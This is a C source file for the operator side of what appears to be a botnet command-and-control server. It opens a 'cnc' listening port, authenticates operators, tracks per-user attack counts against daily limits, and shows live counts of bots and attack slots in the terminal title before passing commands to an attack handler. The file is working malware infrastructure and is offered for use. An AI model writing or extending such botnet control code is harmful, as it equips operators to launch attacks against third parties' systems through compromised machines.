#define _POSIX_C_SOURCE 200112L

#include "../headers/botnet.h"
#include "../headers/colors.h"
#include "../headers/commands.h"
#include "../headers/theme_loader.h"
#include "../headers/users.h"
#include <arpa/inet.h>
#include <poll.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

pthread_mutex_t user_mutex = PTHREAD_MUTEX_INITIALIZER;

static int read_line(int sock, char *buf, size_t sz) {
    size_t used = 0;
    while (used + 1 < sz) {
        char c;
        ssize_t n = recv(sock, &c, 1, 0);
        if (n <= 0) return -1;
        if (c == '\n') break;
        if (c == '\r') continue;
        buf[used++] = c;
    }
    buf[used] = '\0';
    return (int)used;
}

static void send_prompt(User *u, int sock) {
    char *p = load_placeholder_with_subs(u, u->user);
    if (p) {
        send_line(sock, p);
        free_theme_string(p);
    } else {
        char fb[128];
        snprintf(fb, sizeof(fb), "\r" LIME "%s" RED "@STY~# " RESET, u->user);
        send_line(sock, fb);
    }
}

typedef struct {
    int sock;
    int idx;
} TitleArg;

/* terminal title: live bot count. dies when session ends. */
static void *title_loop(void *arg) {
    TitleArg *t = arg;
    int sock = t->sock;
    int idx = t->idx;
    free(t);
    while (1) {
        poll(NULL, 0, 2000);
        char name[50] = {0};
        char atk[32] = {0};
        int alive = 0;
        pthread_mutex_lock(&user_mutex);
        if (idx < user_count && users[idx].is_logged_in && user_sockets[idx] == sock) {
            alive = 1;
            strncpy(name, users[idx].user, 49);
            if (users[idx].maxdaily > 0)
                snprintf(atk, sizeof(atk), "%d/%d", users[idx].attacks_today, users[idx].maxdaily);
            else
                snprintf(atk, sizeof(atk), "%d/Inf", users[idx].attacks_today);
        }
        pthread_mutex_unlock(&user_mutex);
        if (!alive) break;
        char slots[32];
        int lim = global_slots();
        if (lim > 0) snprintf(slots, sizeof(slots), "%d/%d", slot_active_count(), lim);
        else snprintf(slots, sizeof(slots), "%d/inf", slot_active_count());
        int total = 0, freeb = 0;
        bot_counts(&total, &freeb, NULL);
        char ttl[256];
        snprintf(ttl, sizeof(ttl), "\033]0;Bots: %d (%d free) | Slots: %s | Attacks: %s | %s\007",
                 total, freeb, slots, atk, name);
        if (send_line(sock, ttl) < 0) break;
    }
    return NULL;
}

static void spawn_title(int sock, int idx) {
    TitleArg *t = malloc(sizeof(TitleArg));
    if (!t) return;
    t->sock = sock;
    t->idx = idx;
    pthread_attr_t at;
    pthread_attr_init(&at);
    pthread_attr_setstacksize(&at, 256 * 1024);
    pthread_attr_setdetachstate(&at, PTHREAD_CREATE_DETACHED);
    pthread_t th;
    if (pthread_create(&th, &at, title_loop, t) != 0) free(t);
    pthread_attr_destroy(&at);
}

static void *user_session(void *arg) {
    int sock = *(int *)arg;
    free(arg);

    struct sockaddr_in a;
    socklen_t al = sizeof(a);
    char ip[32] = "?";
    if (getpeername(sock, (struct sockaddr *)&a, &al) == 0) {
        inet_ntop(AF_INET, &a.sin_addr, ip, sizeof(ip));
    }

    char buf[1024];
    LoginTheme *lt = load_login_theme(NULL);
    send_line(sock, lt ? lt->user_prompt : "Username: ");
    if (read_line(sock, buf, sizeof(buf)) < 0) {
        if (lt) free_login_theme(lt);
        close(sock);
        return NULL;
    }
    char username[64] = {0};
    strncpy(username, buf, 63);
    send_line(sock, lt ? lt->pass_prompt : "Password: ");
    if (lt) free_login_theme(lt);
    if (read_line(sock, buf, sizeof(buf)) < 0) { close(sock); return NULL; }
    char password[64] = {0};
    strncpy(password, buf, 63);

    int idx = check_login(username, password);
    if (idx == -1) {
        load_users();
        idx = check_login(username, password);
    }
    if (idx == -1) {
        send_line(sock, RED "Invalid login\r\n" RESET);
        log_user(username, ip, "failed login");
        close(sock);
        return NULL;
    }
    if (idx == -2) {
        send_line(sock, RED "Already connected\r\n" RESET);
        close(sock);
        return NULL;
    }

    pthread_mutex_lock(&user_mutex);
    users[idx].is_logged_in = 1;
    user_sockets[idx] = sock;
    strncpy(users[idx].ip, ip, 31);
    users[idx].ip[31] = '\0';
    users[idx].login_at = time(NULL);
    pthread_mutex_unlock(&user_mutex);

    User *u = &users[idx];
    send_line(sock, "\033[H\033[J");
    char *banner = load_banner(u);
    if (banner) {
        send_line(sock, banner);
        free_theme_string(banner);
    }
    spawn_title(sock, idx);
    log_user(u->user, ip, "logged in");

    char cmd[MAX_CMD];
    while (1) {
        send_prompt(u, sock);
        if (read_line(sock, cmd, sizeof(cmd)) < 0) break;
        if (cmd[0] == '\0') continue;
        if (strcmp(cmd, "!exit") == 0) {
            send_themed(sock, "{LIME}Bye\r\n{RESET}");
            break;
        }
        handle_command(u, cmd, sock, ip);
        /* session may have been kicked/closed */
        char tmp;
        if (recv(sock, &tmp, 1, MSG_PEEK | MSG_DONTWAIT) == 0) break;
    }

    pthread_mutex_lock(&user_mutex);
    if (idx < user_count && user_sockets[idx] == sock) user_sockets[idx] = 0;
    if (idx < user_count) {
        users[idx].is_logged_in = 0;
        users[idx].ip[0] = '\0';
        users[idx].login_at = 0;
    }
    pthread_mutex_unlock(&user_mutex);
    close(sock);
    return NULL;
}

void *user_listener(void *arg) {
    (void)arg;
    int ls = socket(AF_INET, SOCK_STREAM, 0);
    int one = 1;
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = INADDR_ANY;
    a.sin_port = htons((uint16_t)g_cncport);
    if (bind(ls, (struct sockaddr *)&a, sizeof(a)) < 0) { perror("cnc bind"); _exit(1); }
    if (listen(ls, 64) < 0) { perror("cnc listen"); _exit(1); }
    while (1) {
        int s = accept(ls, NULL, NULL);
        if (s < 0) continue;
        int *p = malloc(sizeof(int));
        if (!p) { close(s); continue; }
        *p = s;
        pthread_attr_t at;
        pthread_attr_init(&at);
        pthread_attr_setstacksize(&at, 256 * 1024);
        pthread_attr_setdetachstate(&at, PTHREAD_CREATE_DETACHED);
        pthread_t t;
        if (pthread_create(&t, &at, user_session, p) != 0) { close(s); free(p); }
        pthread_attr_destroy(&at);
    }
    return NULL;
}
